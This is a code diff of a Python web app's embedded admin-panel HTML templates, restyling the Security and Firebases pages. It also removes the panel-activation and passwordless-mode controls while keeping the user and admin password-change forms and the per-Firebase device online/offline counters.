-.logout-btn{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);padding:10px 12px;border-radius:8px;font-size:11px;font-weight:700;text-decoration:none;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.container{max-width:640px;margin:0 auto;padding:14px}
-.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:20px;margin-bottom:14px}
-.card h3{font-size:13px;color:#ff3860;margin-bottom:6px;font-weight:900;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.card p.desc{font-size:11px;color:#4a5270;margin-bottom:16px;letter-spacing:1px;line-height:1.6;font-family:'Courier New',monospace}
+<meta name="theme-color" content="#f59e0b">
+<style>""" + MOBILE_CSS + r"""
+body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
+.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
+.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
+.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
+.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
+@media(min-width:640px){.nav{order:0;width:auto}}
+.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
+.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
+.nav-link.security{background:#fef3c7;color:#92400e}
+.nav-link.security.active{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
+.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
+.container{max-width:600px;margin:0 auto;padding:14px}
+.card{background:#fff;border-radius:14px;padding:20px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.card h3{font-size:15px;color:#334155;margin-bottom:6px;font-weight:700;display:flex;align-items:center;gap:8px}
+.card p.desc{font-size:12px;color:#94a3b8;margin-bottom:16px}
 .field{margin-bottom:14px}
-.field label{display:block;font-size:10px;color:#7a85a8;font-weight:700;margin-bottom:6px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
+.field label{display:block;font-size:12px;color:#64748b;font-weight:600;margin-bottom:6px}
 .pwd-wrap{position:relative}
-.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;transition:.2s;font-family:'Courier New',monospace;letter-spacing:1px}
-.pwd-wrap input:focus{border-color:#ff3860;background:#050810;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
-.pwd-wrap input::placeholder{color:#4a5270}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#4a5270;padding:4px}
-.toggle-pwd:hover{color:#ff3860}
-.btn{padding:14px 20px;border:none;border-radius:8px;font-weight:900;font-size:12px;transition:.2s;width:100%;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;cursor:pointer}
-.btn.primary{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a}
-.btn.primary:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
-.btn.warning{background:linear-gradient(135deg,#ff3860,#dc2626);color:#fff}
-.btn.warning:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
-.btn.green{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
-.btn.green:hover{box-shadow:0 0 20px rgba(0,255,65,.5)}
+.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;transition:.2s}
+.pwd-wrap input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
+.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#94a3b8;padding:4px}
+.btn{padding:14px 20px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;width:100%;min-height:50px}
+.btn.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
+.btn.warning{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
 .btn:active{transform:scale(.97)}
-.msg{margin-top:12px;padding:12px 14px;border-radius:8px;font-size:11px;display:none;text-align:center;letter-spacing:1px;font-family:'Courier New',monospace}
-.msg.ok{background:rgba(0,255,65,.1);color:#00ff41;border:1px solid rgba(0,255,65,.3);display:block}
-.msg.err{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);display:block}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace;box-shadow:0 0 30px rgba(0,255,65,.5)}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.status-display{background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;padding:16px;margin-bottom:14px;display:flex;align-items:center;gap:12px;font-family:'Courier New',monospace}
-.status-display .status-icon{font-size:28px;flex-shrink:0}
-.status-display .status-info{flex:1}
-.status-display .status-label{font-size:10px;color:#4a5270;letter-spacing:2px;text-transform:uppercase;margin-bottom:2px;font-weight:700}
-.status-display .status-value{font-size:18px;font-weight:900;letter-spacing:1px}
-.status-display.active{border-color:rgba(0,255,65,.4);background:rgba(0,255,65,.05)}
-.status-display.active .status-value{color:#00ff41;text-shadow:0 0 10px rgba(0,255,65,.5)}
-.status-display.inactive{border-color:rgba(255,56,96,.4);background:rgba(255,56,96,.05)}
-.status-display.inactive .status-value{color:#ff3860;text-shadow:0 0 10px rgba(255,56,96,.5)}
-.status-display.temp{border-color:rgba(255,215,0,.4);background:rgba(255,215,0,.05)}
-.status-display.temp .status-value{color:#ffd700;text-shadow:0 0 10px rgba(255,215,0,.5)}
-.status-display.pwdless{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.05)}
-.status-display.pwdless .status-value{color:#00e5ff;text-shadow:0 0 10px rgba(0,229,255,.5)}
-.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
-.btn-row button{padding:12px 8px;font-size:11px}
-.timer-row{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
-.timer-row button{padding:10px 4px;font-size:10px;background:#1f2937;border:1px solid #374151;color:#7a85a8;border-radius:6px;font-weight:700;letter-spacing:.5px;font-family:'Courier New',monospace;cursor:pointer}
-.timer-row button:hover{border-color:#ffd700;color:#ffd700}
-.timer-row button:active{transform:scale(.96)}
-.custom-timer{display:flex;gap:6px;margin-bottom:10px}
-.custom-timer input{flex:1;padding:10px;background:#0a0e1a;border:1px solid #1f2937;border-radius:6px;color:#e0e6ff;font-family:'Courier New',monospace;outline:none}
-.custom-timer input:focus{border-color:#ffd700}
-.custom-timer button{padding:10px 14px;background:#ffd700;color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;letter-spacing:1px;font-family:'Courier New',monospace;cursor:pointer}</style></head><body>
+.msg{margin-top:12px;padding:12px 14px;border-radius:10px;font-size:13px;display:none;text-align:center}
+.msg.ok{background:#dcfce7;color:#166534;display:block}
+.msg.err{background:#fee2e2;color:#991b1b;display:block}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
+.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="toxic">☣ TOXIC</span> SECURITY<span class="root-badge">👑 ROOT</span></div>
-<a href="/logout" class="logout-btn">⏻ EXIT</a>
-<div class="nav"><a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a><a href="/supermasteradmin/firebases" class="nav-link">🔥 FIREBASES</a><a href="/supermasteradmin/security" class="nav-link active">🔒 SECURITY</a></div>
+<div class="brand"><span class="alex">Alex</span> SECURITY<span class="admin-badge">👑</span></div>
+<a href="/logout" class="logout-btn">Logout</a>
+<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link security active">🔒 Security</a></div>
 </div>
 
 <div class="container">
-
 <div class="card">
-<h3>⚡ USER PANEL CONTROL</h3>
-<p class="desc">Activate / deactivate user panel. Set temporary access with auto-expiry. Toggle passwordless entry.</p>
-
-<div id="panel-status-display" class="status-display">
-<div class="status-icon">⏳</div>
-<div class="status-info">
-<div class="status-label">PANEL STATUS</div>
-<div class="status-value" id="panel-status-val">LOADING...</div>
-</div>
-</div>
-
-<div style="margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ QUICK TOGGLE</div>
-<div class="btn-row">
-<button class="btn green" onclick="panelActivate(0)">🟢 ACTIVATE (∞)</button>
-<button class="btn warning" onclick="panelDeactivate()">🔴 DEACTIVATE</button>
-</div>
-
-<div style="margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ TEMPORARY ACTIVATION</div>
-<div class="timer-row">
-<button onclick="panelActivate(15)">15m</button>
-<button onclick="panelActivate(60)">1h</button>
-<button onclick="panelActivate(360)">6h</button>
-<button onclick="panelActivate(1440)">24h</button>
-</div>
-<div class="custom-timer">
-<input type="number" id="custom-min" placeholder="Custom minutes" min="1">
-<button onclick="panelActivate(parseInt(document.getElementById('custom-min').value)||0)">SET</button>
-</div>
-
-<div style="margin-top:16px;margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ PASSWORDLESS MODE</div>
-<div class="btn-row">
-<button class="btn green" onclick="setPasswordless(true)">🔓 ENABLE (∞)</button>
-<button class="btn warning" onclick="setPasswordless(false)">🔒 DISABLE</button>
-</div>
-<div class="timer-row">
-<button onclick="setPasswordless(true, 15)">15m</button>
-<button onclick="setPasswordless(true, 60)">1h</button>
-<button onclick="setPasswordless(true, 360)">6h</button>
-<button onclick="setPasswordless(true, 1440)">24h</button>
-</div>
-
-<div class="msg" id="panel-msg"></div>
-</div>
-
-<div class="card">
-<h3>👤 CHANGE USER PASSWORD</h3>
-<p class="desc">USER PANEL LOGIN PASSWORD. PERSISTS IN MONGODB.</p>
+<h3>👤 Change User Password</h3>
+<p class="desc">Ye password user panel login ke liye. MongoDB me permanent save hoga.</p>
 <div class="field">
-<label>▸ NEW USER PASSWORD</label>
+<label>New User Password</label>
 <div class="pwd-wrap">
-<input type="password" id="user-pwd" placeholder="ENTER NEW USER PASSWORD">
-<span class="toggle-pwd" onclick="togglePwd('user-pwd', event)">👁</span>
+<input type="password" id="user-pwd" placeholder="Enter new user password">
+<span class="toggle-pwd" onclick="togglePwd('user-pwd', event)">👁️</span>
 </div>
 </div>
-<button class="btn primary" onclick="changeUserPwd()">▶ UPDATE USER PASSWORD</button>
+<button class="btn primary" onclick="changeUserPwd()">Update User Password</button>
 <div class="msg" id="user-msg"></div>
 </div>
 
 <div class="card">
-<h3>👑 CHANGE ADMIN PASSWORD</h3>
-<p class="desc">ROOT PANEL LOGIN PASSWORD. PERSISTS IN MONGODB.</p>
+<h3>👑 Change Admin Password</h3>
+<p class="desc">Ye password admin panel login ke liye. MongoDB me permanent save hoga.</p>
 <div class="field">
-<label>▸ NEW ADMIN PASSWORD</label>
+<label>New Admin Password</label>
 <div class="pwd-wrap">
-<input type="password" id="admin-pwd" placeholder="ENTER NEW ROOT PASSWORD">
-<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁</span>
+<input type="password" id="admin-pwd" placeholder="Enter new admin password">
+<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁️</span>
 </div>
 </div>
-<button class="btn warning" onclick="changeAdminPwd()">▶ UPDATE ROOT PASSWORD</button>
+<button class="btn warning" onclick="changeAdminPwd()">Update Admin Password</button>
 <div class="msg" id="admin-msg"></div>
 </div>
-
 </div>
 
 <div id="toast" class="toast"></div>
 
 <script>
-let panelStatusTimer = null;
-
 function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
-function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁'; } }
+function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁️'; } }
 function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }
-
-function formatRemaining(secs){
-  if(secs <= 0) return 'EXPIRED';
-  const h = Math.floor(secs/3600);
-  const m = Math.floor((secs%3600)/60);
-  const s = secs%60;
-  if(h > 0) return `${h}h ${m}m ${s}s`;
-  if(m > 0) return `${m}m ${s}s`;
-  return `${s}s`;
-}
-
-async function loadPanelStatus(){
-  try{
-    const r = await fetch('/api/panel/status');
-    const d = await r.json();
-    if(!d.success) return;
-    const display = document.getElementById('panel-status-display');
-    const val = document.getElementById('panel-status-val');
-    const now = Math.floor(Date.now()/1000);
-    if(!d.active){
-      display.className = 'status-display inactive';
-      display.querySelector('.status-icon').textContent = '🔴';
-      val.textContent = 'DEACTIVATED';
-    } else if(d.passwordless){
-      display.className = 'status-display pwdless';
-      display.querySelector('.status-icon').textContent = '🔓';
-      val.textContent = 'PASSWORDLESS · ACTIVE';
-    } else if(d.expires_at > 0){
-      const rem = Math.max(0, d.expires_at - now);
-      display.className = 'status-display temp';
-      display.querySelector('.status-icon').textContent = '⏱';
-      val.textContent = 'TEMP · ' + formatRemaining(rem);
-    } else {
-      display.className = 'status-display active';
-      display.querySelector('.status-icon').textContent = '🟢';
-      val.textContent = 'ACTIVE · UNLIMITED';
-    }
-  }catch(e){}
-}
-
-async function panelActivate(minutes){
-  try{
-    const r = await fetch('/api/panel/activate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({minutes: minutes}) });
-    const d = await r.json();
-    if(d.success){
-      const msg = minutes > 0 ? `✅ PANEL ACTIVATED FOR ${minutes} MINUTES` : '✅ PANEL ACTIVATED (UNLIMITED)';
-      showMsg('panel-msg', msg, 'ok');
-      toast(msg); loadPanelStatus();
-    } else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
-  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
-}
-
-async function panelDeactivate(){
-  if(!confirm('Deactivate user panel? Users will be blocked immediately.')) return;
-  try{
-    const r = await fetch('/api/panel/deactivate', { method: 'POST', headers: {'Content-Type': 'application/json'} });
-    const d = await r.json();
-    if(d.success){ showMsg('panel-msg', '✅ PANEL DEACTIVATED', 'ok'); toast('🔴 DEACTIVATED'); loadPanelStatus(); }
-    else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
-  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
-}
-
-async function setPasswordless(enabled, minutes){
-  try{
-    const r = await fetch('/api/panel/passwordless', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({enabled: enabled, minutes: minutes || 0}) });
-    const d = await r.json();
-    if(d.success){
-      let msg = enabled ? '✅ PASSWORDLESS ENABLED' : '✅ PASSWORDLESS DISABLED';
-      if(enabled && minutes > 0) msg = `✅ PASSWORDLESS FOR ${minutes} MINUTES`;
-      showMsg('panel-msg', msg, 'ok'); toast(msg); loadPanelStatus();
-    } else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
-  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
-}
-
 async function changeUserPwd(){
   const pwd = document.getElementById('user-pwd').value.trim();
-  if(!pwd || pwd.length < 4){ showMsg('user-msg', '❌ MIN 4 CHARS', 'err'); return; }
+  if(!pwd || pwd.length < 4){ showMsg('user-msg', '❌ Min 4 chars', 'err'); return; }
   const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'user', password: pwd}) });
   const d = await r.json();
-  if(d.success){ showMsg('user-msg', '✅ USER PASSWORD SAVED', 'ok'); document.getElementById('user-pwd').value = ''; toast('✅ CHANGED'); }
-  else { showMsg('user-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  if(d.success){ showMsg('user-msg', '✅ User password saved!', 'ok'); document.getElementById('user-pwd').value = ''; toast('✅ Changed'); }
+  else { showMsg('user-msg', '❌ ' + (d.error || 'Error'), 'err'); }
 }
-
 async function changeAdminPwd(){
   const pwd = document.getElementById('admin-pwd').value.trim();
-  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ MIN 4 CHARS', 'err'); return; }
+  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ Min 4 chars', 'err'); return; }
   const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'admin', password: pwd}) });
   const d = await r.json();
-  if(d.success){ showMsg('admin-msg', '✅ ROOT PASSWORD SAVED', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ CHANGED'); }
-  else { showMsg('admin-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
+  if(d.success){ showMsg('admin-msg', '✅ Admin password saved!', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ Changed'); }
+  else { showMsg('admin-msg', '❌ ' + (d.error || 'Error'), 'err'); }
 }
-
-loadPanelStatus();
-panelStatusTimer = setInterval(loadPanelStatus, 3000);
 </script>
 </body>
 </html>
@@ -2323,125 +2219,123 @@ panelStatusTimer = setInterval(loadPanelStatus, 3000);
 
 
 # ==================== FIREBASES HTML ====================
+# ✅ Per-firebase online/offline count
 FIREBASES_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebases</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Firebases — Alex OTP</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#ff3860">
-<style>""" + HACKER_BASE_CSS + r"""
-body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
-.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(255,56,96,.08)}
-.brand{font-size:16px;font-weight:900;letter-spacing:2px}
-.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent}
-.brand .root-badge{font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:6px;font-weight:900;letter-spacing:1px}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
-@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
-.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.nav-link:hover{color:#ff3860;border-color:rgba(255,56,96,.3)}
-.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(255,56,96,.4)}
-.conn{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:6px 10px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.conn.online{color:#00ff41;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3)}
-.conn.offline{color:#ff3860;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3)}
-.conn .dot{width:7px;height:7px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
+<meta name="theme-color" content="#7c3aed">
+<style>""" + MOBILE_CSS + r"""
+body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
+.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
+.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
+.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
+.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
+@media(min-width:640px){.nav{order:0;width:auto}}
+.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
+.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
+.nav-link.security{background:#fef3c7;color:#92400e}
+.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
+.conn.online{color:#16a34a;background:#dcfce7}
+.conn.offline{color:#dc2626;background:#fee2e2}
+.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
 .container{max-width:900px;margin:0 auto;padding:14px}
-.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:14px}
-.card h3{font-size:12px;color:#ff3860;margin-bottom:12px;font-weight:900;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
+.card{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.card h3{font-size:13px;color:#334155;margin-bottom:12px;font-weight:700;display:flex;align-items:center;gap:8px}
 .add-row{display:flex;gap:8px;flex-wrap:wrap}
-.add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;font-family:'Courier New',monospace;letter-spacing:1px}
-.add-row input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
-.add-row input::placeholder{color:#4a5270}
-button{padding:14px 18px;border:none;border-radius:8px;font-weight:900;font-size:12px;transition:.2s;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;cursor:pointer}
-button.primary{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a}
-button.primary:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
-button.gray{background:#1f2937;color:#7a85a8;border:1px solid #374151}
-button.danger{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3)}
-button.danger-solid{background:linear-gradient(135deg,#ff3860,#dc2626);color:#fff}
-button.danger-solid:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
-button.green{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
+.add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;font-family:monospace}
+.add-row input:focus{border-color:#8b5cf6;background:#fff}
+button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;min-height:50px}
+button.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
+button.gray{background:#f1f5f9;color:#475569}
+button.danger{background:#fef2f2;color:#dc2626}
+button.danger-solid{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff}
+button.green{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
 button:active{transform:scale(.97)}
 .bulk-area{margin-top:10px;display:none}
-.bulk-area textarea{width:100%;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;font-size:12px;min-height:120px;font-family:'Courier New',monospace;outline:none;color:#e0e6ff;resize:vertical;letter-spacing:.5px}
-.bulk-area textarea:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
+.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
+.bulk-area textarea:focus{border-color:#8b5cf6;background:#fff}
 .bulk-area button{margin-top:8px}
-.msg{margin-top:10px;padding:12px 14px;border-radius:8px;font-size:11px;display:none;letter-spacing:1px;font-family:'Courier New',monospace}
-.msg.ok{background:rgba(0,255,65,.1);color:#00ff41;border:1px solid rgba(0,255,65,.3);display:block}
-.msg.err{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);display:block}
+.msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
+.msg.ok{background:#dcfce7;color:#166534;display:block}
+.msg.err{background:#fee2e2;color:#991b1b;display:block}
 .fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px}
-.fb-header h2{font-size:12px;font-weight:900;color:#ff3860;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
+.fb-header h2{font-size:14px;font-weight:800;color:#334155;display:flex;align-items:center;gap:8px}
 .fb-header .actions{display:flex;gap:6px;flex-wrap:wrap}
-.fb-header .actions button{padding:10px 12px;font-size:10px;min-height:44px}
+.fb-header .actions button{padding:10px 12px;font-size:12px;min-height:44px}
 .fb-list{display:grid;gap:10px}
-.fb-card{background:#0a0e1a;border:1px solid #1f2937;border-radius:10px;padding:14px;display:flex;align-items:center;gap:12px;transition:.15s;flex-wrap:wrap;position:relative;overflow:hidden}
-.fb-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(180deg,#ff3860,#ff9500);opacity:0;transition:.2s}
-.fb-card:hover{border-color:rgba(255,56,96,.3)}
-.fb-card:hover::before{opacity:1}
-.fb-icon{width:44px;height:44px;border-radius:8px;background:rgba(255,149,0,.15);border:1px solid rgba(255,149,0,.3);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;color:#ff9500}
+.fb-card{background:#fff;border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);border:2px solid transparent;flex-wrap:wrap}
+.fb-card:active{transform:scale(.98)}
+.fb-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#fef3c7,#fde68a);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
 .fb-info{flex:1;min-width:0;cursor:pointer}
-.fb-name{font-size:13px;font-weight:900;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.fb-hash{font-size:10px;color:#4a5270;margin-top:2px;font-family:'Courier New',monospace;word-break:break-all;letter-spacing:1px}
+.fb-name{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.fb-hash{font-size:11px;color:#94a3b8;margin-top:2px;font-family:monospace;word-break:break-all}
+/* ✅ Online/Offline count pills */
 .fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
-.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;letter-spacing:1px;font-family:'Courier New',monospace}
-.fb-count-pill.online{background:rgba(0,255,65,.15);color:#00ff41;border:1px solid rgba(0,255,65,.3)}
-.fb-count-pill.offline{background:rgba(255,56,96,.15);color:#ff3860;border:1px solid rgba(255,56,96,.3)}
-.fb-count-pill.devices{background:rgba(0,229,255,.15);color:#00e5ff;border:1px solid rgba(0,229,255,.3)}
-.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor;box-shadow:0 0 6px currentColor}
+.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:3px 8px;border-radius:8px}
+.fb-count-pill.online{background:#dcfce7;color:#166534}
+.fb-count-pill.offline{background:#fee2e2;color:#991b1b}
+.fb-count-pill.devices{background:#e0e7ff;color:#3730a3}
+.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
